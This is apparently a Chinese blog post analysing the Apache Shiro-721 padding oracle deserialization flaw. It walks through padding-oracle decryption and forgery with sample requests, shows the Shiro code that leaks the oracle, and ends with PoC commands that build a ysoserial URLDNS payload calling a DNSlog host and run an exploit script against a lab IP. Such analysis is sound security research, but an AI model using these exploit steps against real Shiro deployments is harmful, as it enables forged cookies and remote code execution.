---
title: Apache Shiro Padding Oracle反序列化漏洞分析（下）
description: 尝试了很久，才敢说明白了Shiro Padding Oracle反序列化漏洞的基本原理，内容有点多，分上下两篇分析一下
categories:
 - 漏洞分析
tags:
 - 漏洞分析
---

### 0x00 Padding Oracle
这一节主要来自于[文章：Automated Padding Oracle Attacks With PadBuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

翻译其中的一部分，让大家了解Padding Oracle漏洞，文中没有提具体的算法，所以以8字节为例，而不是我上一篇文章中的AES-128-CBC

#### 基本场景
某个应用程序使用HTTP的参数传递一个加密后的内容，参数使用CBC模式加密，每次使用不同的初始化向量（IV，Initialization Vector），并添加在密文最前部

当应用程序接受代改参数的请求后，有三种情况的返回

* 接受正确的密文（填充正确包含合法值），应用程序返回HTTP 200
* 接受非法的密文（解密后填充不正确），应用程序返回HTTP 500，返回框架错误页面
* 接受合法的密文（填充正确，值不合法），应用程序显示自定义错误HTTP 200，但是有返回自定义错误页面

上述的场景体现了一个典型的Padding Oracle（填充提示），我们可以通过利用应用程序的行为轻易了解某个加密的值是否填充正确，这里的单词Oracle代表了一种机制，用于了解某个测试是否通过

#### 正常情况的加解密过程
比如我们加密明文`BRIAN;12;2;`

密文在URL中如下显示

```
http://sampleapp/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
```

在实际情况中，攻击者并不会知道这里所对应的明文是多少，不过作为示例，我们已经知道了明文、填充、以及加密后的值（如下图）

![0-1](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-1.png)

正如之前所提到的那样，IV添加在密文的前段，即最前面8个字节

加密过程

![0-2](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-2.png)

解密过程

![0-3](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-3.png)

值得注意的是，解密之后的最后一个数据块，其结尾应该包含正确的填充序列，如果不满足，加解密程序会抛出填充异常

#### 利用Padding Oracle解密
我们将每次操作一个单独的加密块，因此我们可以独立出第一块密文（IV后的那块），在前面加上全为NULL的IV值，并发送至应用程序

```
Request: http://sampleapp/home.jsp?UID=0000000000000000F851D6CC68FC9537
Response: 500 - Internal Server Error
```

回复500说明填充异常，这是意料之中的，我们只处理单个数据块，因此它的结尾必须包含正确的填充字节

![0-4](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-4.png)

如上图所示，在解密之后，数据块的末尾并没有包含正确的填充序列，因此出现了异常

我们将IV加1，并且发送同样密文

```
Request: http://sampleapp/home.jsp?UID=0000000000000001F851D6CC68FC9537
Response: 500 - Internal Server Error
```

![0-5](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-5.png)

我们同样得到了500异常，但是，解密的最后一个字节会变化，从`0x3C`变成了`0x3D`

如果我们重复发送这样的请求，每次将IV的最后一个字节加一（直至`0xFF`），那么最终我们将会产生一个合法的单字节填充序列（`0x01`）

对于可能的256个值中，只有一个值会产生正确的填充字节`0x01`，遇上这个值的时候，会得到一个不同于其他255个请求的回复结果

```
Request: http://sampleapp/home.jsp?UID=000000000000003CF851D6CC68FC9537
Response: 200 OK
```

![0-6](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-6.png)

这时，我们可以推断出中间值（Intermediary Value）的最后一个字节

```
if [Intermediary Byte] ^ 0×3C == 0×01, 
then [Intermediary Byte] == 0×3C ^ 0×01, 
so [Intermediary Byte] == 0×3D
```

根据CBC的解密流程，解密的过程中，中间值的每个字节都会与密文中的前一个数据块（对于第一个数据块来说便是IV）的对应字节进行异或操作，也就是说，我们可以通过控制当前加密块的这个字节，固定住中间值，通过改变上一个加密块的对应字节来改变解密出来的明文的值

也可以根据这个获取明文，比如如果原来IV的最后一个字节为`0x0F`，密文是`0x37`，我们得到中间值`0x3D`，则得到原来的明文为`0x02`

我们现在已经破解了示例数据块中的第8个字节，往前破解第7个字节的中间值，在破解第7个字节的时候，我们要做的事情也差不多，不过此时要求第7个字节与第8个字节都为`0x02`

我们已经知道，中间值的最后一个字节是`0x3D`，因此我们可以将IV中的第8个字节设为`0x3F`（解密得到`0x02`）并暴力枚举IV的第七个字节（从`0x00`开始，直至`0xFF`）

![0-7](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-7.png)

![0-8](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-8.png)

如上图，得到解密后的第7个字节成为`0x02`，此时IV中的字节为`0x24`

运用这种技巧，我们可以最终得到解密后的中间值，也就是当整个数据块的填充值都是`0x08`

![0-9](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-9.png)

#### 加密任意值
通过上面我们已经知道如何利用Padding Oracle来破解每个加密的数据块，现在来看下如何使用漏洞来加密任意数据块

旦我们可以推断出密文数据块的中间值，我们便能通过操作IV的值来完全控制解密所得到的结果

如果想要将密文中第一个数据块解密为“TEST”这个值，您可以计算出它所需要的IV值，只要将目标明文与中间值进行异或操作即可

只要将字符串"TEST"和4个`0x04`填充字节与中间值异或之后，便可以得到最终的IV，即`0×6D，0×36，0×70，0×76，0×03，0×6E，0×22，0×39`

![0-10](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-10.png)

因为可以改变IV，所以这种做法对单个数据块来说没有问题，但是如果想要用它来生成长度超过一个数据块的值怎么办

比如要生成"ENCRYPT TEST"

第一步，还是将文本拆成数据块，并不上必须填充的字节

![0-11](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/0-11.png)

在构造超过一个数据块的值时，我们实际上是从最后一个数据块开始，向前依次生成所需的密文

在"ENCRYPT TEST"中，最后的数据块与之前相同，因此，我们已经知道生成字符串"TEST"的IV和密文

```
Request: http://sampleapp/home.jsp?UID=6D367076036E2239F851D6CC68FC9537
```

接下来，我们需要弄明白中间值6D367076036E2239在作为密文，而不是IV传递至应用程序时会被如何解密

只要使用与之前破解过程相同的技巧就行了，我们把它作为密文传递给应用程序，并从全部为NULL的IV开始进行暴力破解

```
Request: http://sampleapp/home.jsp?UID=00000000000000006D367076036E2239
```

一旦我们通过暴力破解得到中间值之后，IV便可以用来生成我们想要的任意值

新的IV可以被放在前一个示例的前面，这样便可以得到一个符合我们要求的，包含两个数据块的密文了

这个过程可以不断重复，这样便能生成任意长度的数据了

### 0x01 Shrio Oracle Padding漏洞
按照上面的说明，Shrio要有Oracle Padding漏洞，必须要满足加密使用CBC模式（默认使用AES-128-CBC，满足条件），有填充提示

* 接受正确的密文（填充正确包含合法值），应用程序返回HTTP 200
* 接受非法的密文（解密后填充不正确），应用程序返回HTTP 500，返回框架错误页面
* 接受合法的密文（填充正确，值不合法），应用程序显示自定义错误HTTP 200，但是有返回自定义错误页面

实际上不是原本的请求，都不满足第一条，所以只要填充正确和填充不正确返回不同就可以了

#### 环境搭建
```
$ git clone https://github.com/3ndz/Shiro-721.git
$ cd Shiro-721/Docker
$ docker build -t shiro-721 .
$ docker run -p 8080:8080 -d shiro-721
```

#### shrio中的填充提示
我上上面说了只要非原本的请求填充正确和填充不正确返回不同就可以了

第一种：接受正确的密文（填充正确包含合法值）

![1-1](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/1-1.png)

第二种：接受非法的密文（解密后填充不正确），这里填充了16个任意字符

![1-2](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/1-2.png)

第三种：接受合法的密文（填充正确，值不合法），这里填充了一个工具暴破出的合法填充值

![1-3](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/1-3.png)

#### 代码中的填充提示
上面讲了表现，现在我们在代码中寻找证据

和上一篇一样，获取cookie后判断RememberMe的功能在`org.apache.shiro.mgt.AbstractRememberMeManager`里

```
public abstract class AbstractRememberMeManager implements RememberMeManager {
    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = this.getRememberedSerializedIdentity(subjectContext);
            if (bytes != null && bytes.length > 0) {
                principals = this.convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException var4) {
            principals = this.onRememberedPrincipalFailure(var4, subjectContext);
        }
        return principals;
    }

    protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {
        if (log.isDebugEnabled()) {
            log.debug("There was a failure while trying to retrieve remembered principals.  This could be due to a configuration problem or corrupted principals.  This could also be due to a recently changed encryption key.  The remembered identity will be forgotten and not used for this request.", e);
        }
        this.forgetIdentity(context);
        throw e;
    }
}
```

可以看到`getRememberedPrincipals`里的`convertBytesToPrincipals`进行解密和反序列化操作，如果错误，调用`onRememberedPrincipalFailure`方法，这个方法又调用了`forgetIdentity`方法

`forgetIdentity`方法的实现在`org.apache.shiro.web.mgt.CookieRememberMeManager`中

```
public class CookieRememberMeManager extends AbstractRememberMeManager {
    protected void forgetIdentity(Subject subject) {
        if (WebUtils.isHttp(subject)) {
            HttpServletRequest request = WebUtils.getHttpRequest(subject);
            HttpServletResponse response = WebUtils.getHttpResponse(subject);
            this.forgetIdentity(request, response);
        }
    }
}
```

其实就是往Response中写入deleteMe

这里有一个问题，我们上面说到，这个验证过程包含解密和反序列化两个步骤，反序列化错误也会抛出错误，造成deleteMe

也就是说，我们暴破Padding的时候，需要保证反序列化的结果不会报错

网上一些文章里说一开始觉得这个漏洞是假的也是这个原因，因为我们无法一下子暴破出含反序列化payload的Padding，所以大家觉得反序列化过程也会出错，就不会有正确的填充提示，没有填充提示，Padding Oracle便会无效

这时候填充提示变成了3种

* 填充错误，报错
* 填充正确，反序列化错误，报错
* 填充正确，反序列化正确，不报错

但是这时候暴破次数成指数上升

实际上反序列化的二进制数据在后面添加一些脏数据并不会影响反序列化的结果，反序列化用的`ObjectOutputStream`是一个Stream，按队列的方式读下去，拼接无关内容，不会影响反序列化结果

比如原来的cookie是12345678，假设这是一个加密后的反序列化结果，我们想要在之后加上我们最开始一节例子中的"ENCRYPT TEST"，只要将我们想要用来暴破的值加入到后面

比如第一个暴破值`0000000000000000F851D6CC68FC9537`，因为CBC模式加密前一块解密失败不会影响后一块的解密，所以IV的`0000000000000000`不影响后面的结果，后面的padding仍然可以暴破，而`0000000000000000`的解密结果虽然错误，加到原来反序列化的RememberMe的后面不影响反序列化结果

这时候填充提示又变回两种

* 填充错误，报错
* 填充正确，反序列化正确，不报错

这时候暴破又变得简单了

#### PoC验证
[PoC地址](https://github.com/3ndz/Shiro-721/blob/master/exp/shiro_exp.py)

```
class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        # 省略

    def oracle(self, data, **kwargs):
        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)
```

这里`sys.argv[2]`就是原来的Cookie，可以看到原来Cookie加上了测试的值data

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://shiro.dq4cxm.ceye.io"  > shiro.txt
$ python shiro_exp.py http://192.168.0.145:9080/account EJg2mFLy+7AJNpBDihfCHRm2aM9YHcg3ftwZ3ReuuiqrOBb3FBv5DubuUC8I8/B/6L+MxmhWFnViTwIWPyCF2W6hMu4/OlE8VxKWZDMstZ5ypql+OEtlUrVDhlGTXk4MMuEyc+mgdMMo/JzF/BDkWZBe4VXv/Ll5ROZs3B1kse4Z3cpGRo4M38yD2h99zNV7z9vp3HVvY6BBkVXKJWghzjjmd5D8Lun/Cptl5gfqQZCKhMF3Hdq75ktwrF2TNFWbJGseNnD6g6XAQ3X9jtIwu/mFUAZtuV7x3PJJXIHu8Aslv9fjNnEL6e0PQAcGfKd4kpPUsksiWz68uQBBZQ292MQec9wFCDkRu/MTNLVHqyCaQob2wS75MyiFYac+KB56ZtLqlR+ek0/l3eFf2MBOn1PgK6fjZNby+bRNtSMNYAs4r8PyGapFPw35IyllU786besxa07syauRPUP0x5gKiYNK2tCaZV9piJPHqGFh6GhQ7pJAyk+/Qoba/T9A4+eb shiro.txt
```

上面使用ysoserial工具生成反序列化URLDNS gadget的payload，然后作为PoC参数运行PoC

暴破大概需要一两个小时

我们可以在DNSlog平台上看到结果，证明测试成功

![1-4](https://milkfr.github.io/assets/images/posts/2020-02-09-analysis-shiro-padding-oracle-2/1-4.png)

#### 总结
和Shiro-550相同，如果我们要利用RememberMe的反序列化漏洞，必须让客户端可以控制Cookie中的值

Shiro使用默认的AES-128-CBC方式在Shiro-550中因为硬编码泄漏密钥导致漏洞产生

Shiro-721则是因为Padding Oracle导致可以控制需要加密的内容致使漏洞产生

漏洞的产生条件

1. AES-128-CBC的使用不当造成的Padding Oracle，其实这里我觉得CBC模式算法都可以造成漏洞
2. RememberMe使用序列化的Java对象，造成反序列化漏洞，同时反序列化数据后加入脏数据不影响反序列化结果，助长了Padding Oracle

### 0x02 再总结
使用反序列化的地方都要小心，一定要防止不可信任的人控制序列化的数据

我们可以看到这里即使使用了AES加密还是两次被人找到漏洞，并且结果都可以导致远程RCE

而这次两个AES加密的漏洞也非常扩展人的知识面

一定要避免滥用反序列化
